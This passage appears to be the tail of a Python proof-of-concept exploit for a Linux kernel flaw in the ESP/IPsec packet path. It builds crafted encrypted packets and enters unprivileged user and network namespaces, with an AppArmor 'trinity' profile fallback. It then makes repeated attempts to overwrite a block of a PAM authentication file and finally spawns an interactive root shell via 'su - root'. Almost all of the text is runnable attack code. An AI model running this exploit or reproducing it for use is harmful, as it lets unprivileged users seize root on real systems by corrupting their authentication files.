        raise ValueError("prefix length must be 8 + 16 + N*16")
    if len(desired_block) != 16:
        raise ValueError("desired block must be exactly 16 bytes")
    target_block = target_path.read_bytes()[target_offset : target_offset + 16]
    if len(target_block) != 16:
        raise ValueError("target block is shorter than 16 bytes")
    if desired_block[-2:] != bytes([0, NEXTHDR_UDP]):
        raise ValueError("last two desired bytes must be ESP padlen=0,nexthdr=UDP")

    controlled_blocks = (prefix_len - 24) // 16
    c_blocks = [bytes([0x40 + (idx & 0x3F)]) * 16 for idx in range(controlled_blocks)]
    c_blocks[-1] = xor16(aes_crypt(target_block, decrypt=True), desired_block)

    plaintext_blocks = [b""] * (controlled_blocks + 1)
    for idx in range(1, controlled_blocks):
        plaintext_blocks[idx] = xor16(
            aes_crypt(c_blocks[idx], decrypt=True), c_blocks[idx - 1]
        )
    plaintext_blocks[controlled_blocks] = desired_block

    udp_len = (controlled_blocks + 1) * 16 - 2
    filler0 = plaintext_blocks[1][:8] if controlled_blocks > 1 else b"\x51" * 8
    plaintext_blocks[0] = struct.pack("!HHHH", 5555, 5556, udp_len, 0) + filler0
    post_trim_plaintext = b"".join(plaintext_blocks)[:-2]
    csum = udp6_checksum(src, dst, post_trim_plaintext)
    plaintext_blocks[0] = struct.pack("!HHHH", 5555, 5556, udp_len, csum) + filler0

    iv = xor16(aes_crypt(c_blocks[0], decrypt=True), plaintext_blocks[0])
    esp_header = struct.pack("!II", SPI, SEQ)
    return esp_header + iv + b"".join(c_blocks)


def require_unprivileged_user() -> None:
    if os.geteuid() == 0:
        raise RuntimeError("run this PoC as an ordinary unprivileged user, not root")


def setup() -> None:
    require_unprivileged_user()
    for command in ("gcc", "openssl", "ip", "tc", "unshare", "nsenter", "su"):
        require_command(command)


def first_line(text: str) -> str:
    return next((line.strip() for line in text.splitlines() if line.strip()), "")


def namespace_prefix_works(prefix: list[str]) -> tuple[bool, str]:
    probe = prefix + [
        sys.executable,
        "-c",
        "import os,sys; sys.exit(0 if os.geteuid() == 0 else 1)",
    ]
    try:
        result = subprocess.run(
            probe,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=60,
            check=False,
        )
    except OSError as exc:
        return False, f"errno={exc.errno} {exc.strerror}"
    except subprocess.TimeoutExpired:
        return False, "timed out"
    if result.returncode == 0:
        return True, ""
    return False, first_line(result.stdout)


def private_namespace_prefix() -> list[str]:
    direct = ["unshare", "-Urn"]
    works, detail = namespace_prefix_works(direct)
    if works:
        print("namespace: direct unshare -Urn works", flush=True)
        return direct
    print(f"namespace: direct unshare -Urn failed: {detail}", flush=True)
    aa_exec = shutil.which("aa-exec")
    if aa_exec is None:
        raise RuntimeError(
            "direct unshare -Urn failed and aa-exec is not available for the "
            "AppArmor trinity fallback"
        )
    fallback = [aa_exec, "-p", "trinity", "--", "unshare", "-Urn"]
    print("namespace: trying aa-exec -p trinity -- unshare -Urn fallback", flush=True)
    works, aa_detail = namespace_prefix_works(fallback)
    if works:
        print("namespace: aa-exec -p trinity fallback works", flush=True)
        return fallback
    raise RuntimeError(
        "could not enter a private root-mapped user+network namespace. "
        f"direct unshare failed with: {detail}; aa-exec fallback failed with: "
        f"{aa_detail}"
    )


def exploit_command(
    workdir: Path,
    record: KernelRecord,
    attempt: int,
    namespace_prefix: list[str],
) -> list[str]:
    env_pairs = [
        f"F001_WORKDIR={workdir}",
        f"F001_TARGET_FILE={record.target_file}",
        f"F001_TARGET_OFF={record.target_offset}",
        f"F001_ATTEMPT={attempt}",
        f"F001_TARGET_SRC={record.target_src}",
        f"F001_TARGET_DST={record.target_dst}",
        f"F001_MAL_SRC={record.mal_src}",
        f"F001_MAL_DST={record.mal_dst}",
        f"F001_NETEM_MS={record.netem_ms}",
        f"F001_QUEUE_LIMIT={record.queue_limit}",
        f"F001_SEND_COUNT={record.send_count}",
        f"F001_GUARD_BEFORE={record.guard_before}",
        f"F001_HOLD_USEC={record.hold_usec}",
        f"F001_TRIGGER_START_USEC={record.trigger_start_usec}",
        f"F001_QUEUE_GATE={record.queue_gate}",
        f"F001_SEGMENTS_LEFT={record.segments_left}",
        f"F001_PAYLOAD_LEN={record.payload_len}",
        f"F001_PAD_EXT={record.pad_ext}",
    ]
    base = ["env", *env_pairs, *namespace_prefix, "bash", "-s"]
    return base


def spawn_root_shell() -> int:
    breaker("SPAWNING ROOT SHELL")
    print("interactive root shell follows", flush=True)
    return subprocess.call(["su", "-", "root"])


def prepare_workdir(record: KernelRecord) -> Path:
    workdir = Path(tempfile.mkdtemp(prefix="f001-ah6-", dir="/tmp"))
    workdir.chmod(0o755)
    write_helper(workdir, "ah6_sender", AH6_SENDER_C)
    write_helper(workdir, "esp_splice_sender", ESP_SPLICE_SENDER_C)
    write_helper(workdir, "esp_receiver", ESP_RECEIVER_C)
    prefix = build_esp_prefix(
        record.target_src,
        record.target_dst,
        record.target_path,
        record.target_offset,
        bytes.fromhex(record.desired_block_hex),
        record.prefix_len,
    )
    (workdir / "prefix.bin").write_bytes(prefix)
    (workdir / "prefix.bin").chmod(0o644)
    if record.guard_before:
        target_bytes = record.target_path.read_bytes()
        guard = bytearray(record.target_offset + 16)
        guard[record.target_offset : record.target_offset + 16] = target_bytes[
            record.target_offset : record.target_offset + 16
        ]
        (workdir / "guard.bin").write_bytes(guard)
        (workdir / "guard.bin").chmod(0o644)
    return workdir


def run_attempts(
    workdir: Path,
    record: KernelRecord,
    namespace_prefix: list[str],
) -> bool:
    for attempt in range(1, record.attempts + 1):
        breaker(f"BEGINNING EXPLOIT ATTEMPT {attempt}")
        try:
            run(
                exploit_command(workdir, record, attempt, namespace_prefix),
                input_text=INNER_SCRIPT,
                check=False,
                timeout=35,
            )
        except subprocess.TimeoutExpired:
            print(f"attempt {attempt} timed out", flush=True)
        after = block_hex(record.target_path, record.target_offset)
        print(f"pam block after exploit: {after}", flush=True)
        if after == record.desired_block_hex:
            breaker("PATCH SUCCEEDED")
            return True
    return False


def main() -> int:
    breaker("BEGINNING SETUP")
    setup()
    record = select_kernel_record()
    pin_process_tree(record.affinity_cpu)
    print(
        "placement recipe: "
        f"guard_before={record.guard_before} send_count={record.send_count} "
        f"queue_limit={record.queue_limit} queue_gate={record.queue_gate} "
        f"netem_ms={record.netem_ms} "
        f"trigger_start_usec={record.trigger_start_usec}",
        flush=True,
    )
    namespace_prefix = private_namespace_prefix()
    initial = block_hex(record.target_path, record.target_offset)
    print(f"initial pam block: {initial}", flush=True)
    if initial not in {record.default_block_hex, record.desired_block_hex}:
        print("unexpected target file layout for this kernel record", flush=True)
        return 2

    workdir = prepare_workdir(record)
    print(f"temporary helper directory: {workdir}", flush=True)

    if initial == record.desired_block_hex:
        breaker("TARGET ALREADY PATCHED")
    elif not run_attempts(workdir, record, namespace_prefix):
        breaker("PATCH NOT REACHED")
        return 1
    return spawn_root_shell()


if __name__ == "__main__":
    raise SystemExit(main())
